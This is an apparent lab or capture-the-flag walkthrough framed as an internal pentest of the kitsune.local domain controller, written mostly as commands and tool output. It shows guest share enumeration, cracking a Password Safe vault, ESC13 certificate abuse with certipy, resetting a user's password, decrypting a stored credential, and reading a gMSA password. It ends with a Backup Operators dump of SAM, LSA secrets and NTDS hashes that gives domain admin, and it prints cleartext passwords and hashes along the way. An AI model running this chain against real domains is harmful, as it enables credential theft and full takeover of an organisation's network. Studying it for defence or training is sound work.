# Objective and initial access
You have been hired to perform an internal pentest against the client's Domain Controller. Your task is to identify all vulnerabilities and (if possible) fully compromise the Domain.

The client has provided you with VPN access to their environment, but no other information.

# Host file setup
```python
❯❯❯ sudo nxc smb 10.1.176.128 --generate-hosts-file /etc/hosts
SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration

## Nmap
```python
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-23 16:07:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Not valid before: 2026-10-11T08:21:43
|_Not valid after:  2027-04-12T08:21:43
| rdp-ntlm-info: 
|   Target_Name: KITSUNE
|   NetBIOS_Domain_Name: KITSUNE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: kitsune.local
|   DNS_Computer_Name: DC01.kitsune.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-10-23T16:08:41+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.991%I=7%D=10/23%Time=6ADB865E%P=x86_64-pc-linux-gnu%r(
SF:TerminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x0
SF:2\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth is enabled as with all domain controllers, but cannot use it to enumerate

The guest account is enabled, i can use this to enumerate

## Shares
```python
❯❯❯ nxc smb dc01.kitsune.local -u 'Guest' -p '' --shares
SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.176.128    445    DC01             [+] kitsune.local\Guest: 
SMB         10.1.176.128    445    DC01             [*] Enumerated shares
SMB         10.1.176.128    445    DC01             Share           Permissions     Remark
SMB         10.1.176.128    445    DC01             -----           -----------     ------
SMB         10.1.176.128    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.176.128    445    DC01             C$                              Default share
SMB         10.1.176.128    445    DC01             Files           READ            Global file share
SMB         10.1.176.128    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.176.128    445    DC01             NETLOGON                        Logon server share 
SMB         10.1.176.128    445    DC01             SYSVOL                          Logon server share
```

Read access on the `Files` share

## Users
```python
❯❯❯ nxc smb dc01.kitsune.local -u 'Guest' -p '' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
ranch
schlop
pebble
ross
protagonist
svc_gmsa$
```

Ill use `--rid-brute` in order to also dump machine accounts

# `Files` share

```python
❯❯❯ smbclient //dc01.kitsune.local/Files -U 'Guest'%''
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct 13 05:08:20 2026
  ..                                DHS        0  Thu Oct 15 11:49:47 2026
  10-11-Calendar_October.pdf          A     3190  Tue Oct 13 03:23:43 2026
  10-11-Financial_Report.pdf          A     4076  Tue Oct 13 03:23:49 2026
  10-11-Timesheet.pdf                 A     3854  Tue Oct 13 03:21:23 2026
  logins.psafe3                       A      840  Tue Oct 13 02:59:03 2026

		12974591 blocks of size 4096. 3451899 blocks available
smb: \> recurse on 
smb: \> prompt off
smb: \> mget *
```

Ill download all the files here

![](Pasted%20image%2020261023171737.png)

The calendar reveals a new hire, although this user is not in the user list

![](Pasted%20image%2020261023171903.png)

Not a lot of interesting info in here

![](Pasted%20image%2020261023172014.png)

Once again not a lot of interesting info here

```python
❯❯❯ file logins.psafe3                                                               
logins.psafe3: Password Safe V3 database
```

# Compromising the user `ranch`

The most interesting thing here is the password safe

John the ripper has a 2john tool to generate a hash for this

```python
❯❯❯ pwsafe2john logins.psafe3 | tee psafe.hash
login:$pwsafe$*3*58bbd8a77bbd30d4db16dfc6ac12b5dcd3b4f353866eb7d76baa3ab987fd1cbf*327680*0432c643c46ef76a77d0a3ee583448604b8f7d0af294f12f10ce9bedecbe1260
```

Ill use it to create a hash and save it to a file

```python
❯❯❯ john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 327680 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hellokitty       (login)     
1g 0:00:00:17 DONE (2026-10-23 17:23) 0.05688g/s 465.9p/s 465.9c/s 465.9C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I can crack the hash

![](Pasted%20image%2020261023172556.png)

Ill install the passwordsafe package using apt install, then ill open the file using pwsafe

This is where ill enter the password

![](Pasted%20image%2020261023172647.png)

```python
admin:I#zmE{z[n3HM (Duo login)
ranch:R@nch2026! (Domain creds)
root:a%KlRhqbuRgL
```

These are all the creds extracted from the file

The most interesting logon right now is the domain creds

```python
❯❯❯ nxc smb dc01.kitsune.local -u 'ranch' -p 'R@nch2026!'            
SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.176.128    445    DC01             [+] kitsune.local\ranch:R@nch2026! 
```

This user is now compromised!

# Access on shares as `ranch`

```python
❯❯❯ nxc smb dc01.kitsune.local -u ranch -p 'R@nch2026!' --shares
SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.176.128    445    DC01             [+] kitsune.local\ranch:R@nch2026! 
SMB         10.1.176.128    445    DC01             [*] Enumerated shares
SMB         10.1.176.128    445    DC01             Share           Permissions     Remark
SMB         10.1.176.128    445    DC01             -----           -----------     ------
SMB         10.1.176.128    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.176.128    445    DC01             C$                              Default share
SMB         10.1.176.128    445    DC01             Files           READ,WRITE      Global file share
SMB         10.1.176.128    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.176.128    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.176.128    445    DC01             SYSVOL          READ            Logon server shar
```

I did also try spraying all the passwords found against other users, no luck

I have write to the files share

# ESC13

```python
❯❯❯ certipy-ad find -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-host dc01.kitsune.local -dc-ip 10.1.176.128 -target-ip 10.1.176.128 -target dc01.kitsune.local -stdout -enabled -vulnerable

...[SNIP]...

Certificate Templates
  0
    Template Name                       : Kitsune-User
    Display Name                        : Kitsune-User
    Certificate Authorities             : kitsune-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2026-10-12T22:12:00+00:00
    Template Last Modified              : 2026-10-13T00:52:56+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.10863307.14988779.16010669.3757508.10421200.134.6077557.15214621
    Linked Groups                       : CN=HelpDesk,CN=Users,DC=kitsune,DC=local
    Permissions
      Enrollment Permissions
        Enrollment Rights               : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : KITSUNE.LOCAL\Administrator
        Full Control Principals         : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Owner Principals          : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Dacl Principals           : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Property Enroll           : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : KITSUNE.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'.
```

Looks like its vulnerable to esc13

![](Pasted%20image%2020261023181232.png)

This group has GenericAll on `schlop`

# Compromising `schlop` using ESC13

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked

```python
❯❯❯ certipy-ad req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip '10.1.176.128' -dc-host 'dc01.kitsune.local' -target 'dc01.kitsune.local' -target-ip '10.1.176.128' -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -debug -key-size 4096
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.1.176.128'
[+] DC IP: '10.1.176.128'
[+] DC Host: 'dc01.kitsune.local'
[+] Target IP: '10.1.176.128'
[+] Remote Name: 'dc01.kitsune.local'
[+] Domain: 'KITSUNE.LOCAL'
[+] Username: 'RANCH'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.1.176.128[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.1.176.128[\pipe\cert]
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'ranch@kitsune.local'
[+] Found SID in security extension: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Certificate object SID is 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Saving certificate and private key to 'ranch.pfx'
[+] Attempting to write data to 'ranch.pfx'
[+] Data written to 'ranch.pfx'
[*] Wrote certificate and private key to 'ranch.pfx'
```

I now have the PFX

```python
❯❯❯ certipy-ad auth -pfx 'ranch.pfx' -dc-ip '10.1.176.128' 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ranch@kitsune.local'
[*]     Security Extension SID: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Using principal: 'ranch@kitsune.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ranch.ccache'
[*] Wrote credential cache to 'ranch.ccache'
[*] Trying to retrieve NT hash for 'ranch'
[*] Got hash for 'ranch@kitsune.local': aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1
```

I now have a TGT for the user, this TGT should contain the SID of the helpdesk group

```python
❯❯❯ bloodyAD --host dc01.kitsune.local -d kitsune.local -k set password 'schlop' 'Password123!'
[+] Password changed successfully!
```

Ill then just change the password of the user like bloodhound said i could do

```python
❯❯❯ nxc smb dc01.kitsune.local -u 'schlop' -p 'Password123!' --smb-timeout 4
SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.176.128    445    DC01             [+] kitsune.local\schlop:Password123! 
```

This user is now compromised!

# WINRM access as `schlop`

![](Pasted%20image%2020261023182545.png)

This user can winrm

![](Pasted%20image%2020261023182634.png)

Then i can get the user flag

# Compromising `pebble`

```python
evil-winrm-py PS C:\Users\schlop\Documents> type networkAuth.cred
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">pebble</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000015eb4da53276741952d904a69c440310000000002000000000010660000000100002000000041903d6d7ae4fa86dd56bfe8741f4a15c9e2226d386f88f6aec7f15a5779f3e6000000000e8000000002000020000000b3604d46abd67313eb9a551d3b289c48c922bada4680807c9b7556e0633f19b920000000ae67f87d8559a61c20268cde4649e3538e0c15a7e7153c33e2fc6f7b13c713a44000000064462a2ea8ee6b2bccf09125fa86779431d4ccea0c9a30f2a325239c4199e26982ae745497a01016f90238173a2eb540b47410a39f97e8cb89c8d3ca14bcc8d7</SS>
    </Props>
  </Obj>
</Objs>
evil-winrm-py PS C:\Users\schlop\Documents>
```

This looks to be a DPAPI credential

```python
evil-winrm-py PS C:\Users\schlop\AppData\Roaming\Microsoft\Protect\S-1-5-21-3773590124-4237107295-2360938966-1105> dir -force


    Directory: C:\Users\schlop\AppData\Roaming\Microsoft\Protect\S-1-5-21-3773590124-4237107295-2360938966-1105


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a-hs-        10/13/2026   2:37 AM            876 dab45e01-2753-4167-952d-904a69c44031                                  
-a-hs-        10/13/2026   2:37 AM             24 Preferred                                                             


evil-winrm-py PS C:\Users\schlop\AppData\Roaming\Microsoft\Protect\S-1-5-21-3773590124-4237107295-2360938966-1105>
```

This is the key in appdata

```python
evil-winrm-py PS C:\Users\schlop> (Import-Clixml Documents\networkAuth.cred).GetNetworkCredential().Password
PebbleIs47!
evil-winrm-py PS C:\Users\schlop>
```

Ill then just decrypt the cred

```python
❯❯❯ nxc smb dc01.kitsune.local -u 'pebble' -p 'PebbleIs47!' --smb-timeout 4
SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.176.128    445    DC01             [+] kitsune.local\pebble:PebbleIs47!
```

This user is now compromised!

![](Pasted%20image%2020261023184638.png)

This user can read the gMSA password of the `svc_gmsa$`

# Compromising `svc_gmsa$`

```python
❯❯❯ nxc ldap dc01.kitsune.local -u 'pebble' -p 'PebbleIs47!' --gmsa            
LDAP        10.1.176.128    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
LDAP        10.1.176.128    389    DC01             [+] kitsune.local\pebble:PebbleIs47! 
LDAP        10.1.176.128    389    DC01             [*] Getting GMSA Passwords
LDAP        10.1.176.128    389    DC01             Account: svc_gmsa$            NTLM: 085691c182d60ab1a12466ce7b50d29d     PrincipalsAllowedToReadPassword: IT
```

Ill read the value

```python
❯❯❯ nxc smb dc01.kitsune.local -u 'svc_gmsa$' -H '085691c182d60ab1a12466ce7b50d29d' 
SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.176.128    445    DC01             [+] kitsune.local\svc_gmsa$:085691c182d60ab1a12466ce7b50d29d
```

This user is now compromised!

This user `svc_gmsa$` is in the backup operators group

# Domain Admin

```python  
 ~/hsm/kitsune ❯❯❯ nxc smb dc01.kitsune.local -u 'svc_gmsa$' -H '085691c182d60ab1a12466ce7b50d29d' --smb-timeout 5 -M backup_operator
SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.176.128    445    DC01             [+] kitsune.local\svc_gmsa$:085691c182d60ab1a12466ce7b50d29d 
BACKUP_O... 10.1.176.128    445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 10.1.176.128    445    DC01             Saved HKLM\SAM to \\10.1.176.128\SYSVOL\SAM
BACKUP_O... 10.1.176.128    445    DC01             Saved HKLM\SYSTEM to \\10.1.176.128\SYSVOL\SYSTEM
BACKUP_O... 10.1.176.128    445    DC01             Saved HKLM\SECURITY to \\10.1.176.128\SYSVOL\SECURITY
SMB         10.1.176.128    445    DC01             [*] Copying "SAM" to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SAM"
SMB         10.1.176.128    445    DC01             [+] File "SAM" was downloaded to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SAM"
SMB         10.1.176.128    445    DC01             [*] Copying "SECURITY" to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SECURITY"
SMB         10.1.176.128    445    DC01             [+] File "SECURITY" was downloaded to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SECURITY"
SMB         10.1.176.128    445    DC01             [*] Copying "SYSTEM" to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SYSTEM"
SMB         10.1.176.128    445    DC01             [+] File "SYSTEM" was downloaded to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SYSTEM"
BACKUP_O... 10.1.176.128    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
BACKUP_O... 10.1.176.128    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 10.1.176.128    445    DC01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 10.1.176.128    445    DC01             $MACHINE.ACC:plain_password_hex:dec5c211d4babd91e437304c43c778d6de456ecc929c4814883425cf929e33d9eb7d6d0147c801d263a5467ccf340b2b03dcb1c83a5bad6c7ee81391acf12a9c9b4159c736d32c68e301f35a66536423d3ae3416bbde25d75d79755a63c0b4513ebcae2988d8184eb9ab4927901ec4b09e2f1bb861f06474556cff298c08e4be1d38a0b5862d90920def2e5fc1c664adad34b4f2a31f5139cdba68129fe89b70dde6aac1f3e1f818fe6b8ebc70604c27354432e8e7e7970e3f463d0f92919d58ebbd328d52a9edc1eee7cbcec9a18f0cbb718ec6a273a568c76b630a84a820a8a3f467da2f6e4a31021b03b58ccbb021
BACKUP_O... 10.1.176.128    445    DC01             $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45
BACKUP_O... 10.1.176.128    445    DC01             dpapi_machinekey:0x2d3f243818d41c56a5d560c6f9e8e8e91c63cc7e
dpapi_userkey:0xdbc4e9db99118d5c9bbfa64d0ca5c065bfa814b5
BACKUP_O... 10.1.176.128    445    DC01             NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
SMB         10.1.176.128    445    DC01             [+] kitsune.local\Administrator:2dffec5d0dda0cbc8bf571471641e001 (Pwn3d!)
BACKUP_O... 10.1.176.128    445    DC01             [*] Dumping NTDS...
SMB         10.1.176.128    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.1.176.128    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
SMB         10.1.176.128    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.176.128    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d1c9d31dc9ece5e96fc344c85782ba93:::
SMB         10.1.176.128    445    DC01             kitsune.local\ranch:1103:aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1:::
SMB         10.1.176.128    445    DC01             kitsune.local\schlop:1105:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.1.176.128    445    DC01             kitsune.local\pebble:1106:aad3b435b51404eeaad3b435b51404ee:b83abecf382a399ee1885f72a596d2d3:::
SMB         10.1.176.128    445    DC01             kitsune.local\ross:1107:aad3b435b51404eeaad3b435b51404ee:3f48c34a06f664d675b41282e7606ed7:::
SMB         10.1.176.128    445    DC01             kitsune.local\protagonist:1108:aad3b435b51404eeaad3b435b51404ee:3f48c34a06f664d675b41282e7606ed7:::
SMB         10.1.176.128    445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45:::
SMB         10.1.176.128    445    DC01             svc_gmsa$:1602:aad3b435b51404eeaad3b435b51404ee:085691c182d60ab1a12466ce7b50d29d:::
SMB         10.1.176.128    445    DC01             [+] Dumped 10 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.1.176.128_2026-10-23_193851.ntds of which 8 were added to the database
SMB         10.1.176.128    445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         10.1.176.128    445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.1.176.128_2026-10-23_193851.ntds | cut -d ':' -f1
BACKUP_O... 10.1.176.128    445    DC01             [*] Cleaning dump with user Administrator and hash 2dffec5d0dda0cbc8bf571471641e001 on domain kitsune.local
BACKUP_O... 10.1.176.128    445    DC01             [*] Successfully deleted dump files !
```

Then ill use the nxc module to exploit this, since i dont have any kind of remote access as `svc_gmsa$`

![](Pasted%20image%2020261023194217.png)

Then i can login using the DA hash


